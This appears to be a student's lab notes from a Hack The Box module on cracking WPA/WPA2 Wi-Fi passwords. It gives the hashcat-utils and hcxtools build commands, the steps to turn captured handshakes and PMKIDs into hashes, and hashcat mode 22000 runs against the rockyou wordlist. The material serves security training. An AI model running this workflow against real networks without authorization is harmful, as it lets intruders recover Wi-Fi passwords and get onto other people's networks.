## Cracking MIC

![](Cracking%20Wireless%20(WPA,%20WPA2)%20Handshakes%20with%20HashcatUntitled-20260929-170416.png)
#### Hashcat-Utils - Installation

```sh
3kjS@htb[/htb]$ git clone https://github.com/hashcat/hashcat-utils.git
3kjS@htb[/htb]$ cd hashcat-utils/src
3kjS@htb[/htb]$ make
```
#### Cap2hccapx - Syntax

```sh
3kjS@htb[/htb]$ ./cap2hccapx.bin 

usage: ./cap2hccapx.bin input.cap output.hccapx [filter by essid] [additional network essid:bssid]
```
#### Cap2hccapx - Convert To Crackable File

```sh
3kjS@htb[/htb]$ ./cap2hccapx.bin corp_capture1-01.cap mic_to_crack.hccapx
```
#### Hashcat - Cracking WPA Handshakes

```sh
3kjS@htb[/htb]$ hashcat -a 0 -m 22000 mic_to_crack.hccapx /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```
## Cracking PMKID

![](Cracking%20Wireless%20(WPA,%20WPA2)%20Handshakes%20with%20HashcatUntitled-20260929-170723.png)
#### Hcxtools - Installation

```sh
3kjS@htb[/htb]$ git clone https://github.com/ZerBea/hcxtools.git
3kjS@htb[/htb]$ cd hcxtools
3kjS@htb[/htb]$ make && make install
```
#### Hcxpcapngtool - Help

```sh
3kjS@htb[/htb]$ hcxpcapngtool cracking_pmkid.cap -o pmkidhash_corp
```
#### PMKID-Hash

```sh
3kjS@htb[/htb]$ cat pmkidhash_corp 

7943ba84a475e3bf1fbb1b34fdf6d102*10da43bef746*80822381a9c8*434f52502d57494649
```
#### Hashcat - Cracking PMKID

```sh
3kjS@htb[/htb]$ hashcat -a 0 -m 22000 pmkidhash_corp /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```
#### Extract PMKID - Using Hcxpcaptool

```sh
3kjS@htb[/htb]$ hcxpcaptool -z pmkidhash_corp2 cracking_pmkid.cap
```
#### PMKID-Hash

```sh
3kjS@htb[/htb]$ cat pmkidhash_corp2 

7943ba84a475e3bf1fbb1b34fdf6d102*10da43bef746*80822381a9c8*434f52502d57494649
```
